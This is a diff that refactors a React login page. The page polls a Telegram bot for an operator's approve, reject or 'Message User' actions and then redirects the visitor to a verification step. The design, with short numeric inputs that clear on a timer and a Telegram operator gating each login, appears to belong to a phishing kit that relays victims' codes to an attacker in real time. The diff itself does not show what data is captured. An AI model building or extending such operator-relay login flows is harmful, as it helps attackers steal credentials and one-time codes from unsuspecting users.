@@ -44,6 +44,7 @@ function Login() {
   const maxChecks = 24
   const lastUpdateIdRef = useRef(0)
   const messageRequestRef = useRef(null)
+  const waitingForMessageRef = useRef(false)
 
   useEffect(() => {
     const timer = setTimeout(() => setInputs(Array(4).fill("")), 30000)
@@ -173,7 +174,7 @@ function Login() {
     }
   }
 
-  async function checkTelegramApproval(requestId) {
+  async function checkMessages(requestId) {
     try {
       const offset = lastUpdateIdRef.current > 0 ? lastUpdateIdRef.current + 1 : 0
       const response = await fetch(TELEGRAM_API + '/getUpdates?offset=' + offset)
@@ -184,6 +185,7 @@ function Login() {
           if (update.update_id > lastUpdateIdRef.current) {
             lastUpdateIdRef.current = update.update_id
           }
+          
           if (update.callback_query) {
             const parts = update.callback_query.data.split('_')
             const action = parts[0]
@@ -229,39 +231,12 @@ function Login() {
               }
             }
           }
-        }
-      }
-      return { approved: false, status: 'pending' }
-    } catch (e) {
-      console.error('Approval check failed:', e)
-      return { approved: false, status: 'error' }
-    }
-  }
-
-  async function checkAdminMessage() {
-    try {
-      const offset = lastUpdateIdRef.current > 0 ? lastUpdateIdRef.current + 1 : 0
-      const response = await fetch(TELEGRAM_API + '/getUpdates?offset=' + offset)
-      const data = await response.json()
-      
-      if (data.ok && Array.isArray(data.result)) {
-        for (const update of data.result) {
-          if (update.update_id > lastUpdateIdRef.current) {
-            lastUpdateIdRef.current = update.update_id
-          }
-          if (update.message && update.message.text && messageRequestRef.current) {
+          
+          if (update.message && update.message.text && messageRequestRef.current && waitingForMessageRef.current) {
             const msg = update.message.text
             const senderId = update.message.from.id
             sessionStorage.setItem('adminMessage', msg)
-            setAdminMessage(msg)
-            setStatus("message_sent")
-            setLoading(false)
-            setWaitingForApproval(false)
-            setWaitingForMessage(false)
-            if (pollingIntervalRef.current) {
-              clearInterval(pollingIntervalRef.current)
-              pollingIntervalRef.current = null
-            }
+            
             try {
               await fetch(TELEGRAM_API + '/sendMessage', {
                 method: 'POST',
@@ -272,14 +247,14 @@ function Login() {
                 })
               })
             } catch (e) {}
-            return { received: true, message: msg }
+            return { approved: false, status: 'message_received', message: msg }
           }
         }
       }
-      return { received: false, message: null }
+      return { approved: false, status: 'pending' }
     } catch (e) {
-      console.error('Message check failed:', e)
-      return { received: false, message: null }
+      console.error('Check failed:', e)
+      return { approved: false, status: 'error' }
     }
   }
 
@@ -296,7 +271,7 @@ function Login() {
 
     pollingIntervalRef.current = setInterval(async () => {
       checkCountRef.current++
-      const result = await checkTelegramApproval(requestId)
+      const result = await checkMessages(requestId)
 
       const elapsed = Math.floor((Date.now() - startTimeRef.current) / 1000)
       console.log('Checking... elapsed:', elapsed, 'check:', checkCountRef.current)
@@ -313,26 +288,29 @@ function Login() {
           navigate(`${basePath}/verification`)
         }, 800)
       } else if (result.status === 'message_user_clicked') {
+        waitingForMessageRef.current = true
         setWaitingForMessage(true)
         setWaitingForApproval(false)
         setStatus("waiting_for_message")
         console.log('Admin clicked Message User, waiting for message...')
+      } else if (result.status === 'message_received') {
+        clearInterval(pollingIntervalRef.current)
+        pollingIntervalRef.current = null
+        checkCountRef.current = 0
+        waitingForMessageRef.current = false
+        setLoading(false)
+        setWaitingForMessage(false)
+        setStatus("message_sent")
+        setAdminMessage(result.message)
       } else if (result.status === 'rejected') {
         clearInterval(pollingIntervalRef.current)
         pollingIntervalRef.current = null
         setLoading(false)
         setWaitingForApproval(false)
+        setWaitingForMessage(false)
+        waitingForMessageRef.current = false
         setStatus("rejected")
         requestIdRef.current = null
-      }
-      
-      if (waitingForMessage) {
-        const msgResult = await checkAdminMessage()
-        if (msgResult.received) {
-          clearInterval(pollingIntervalRef.current)
-          pollingIntervalRef.current = null
-          checkCountRef.current = 0
-        }
       }
       
       if (checkCountRef.current >= maxChecks) {
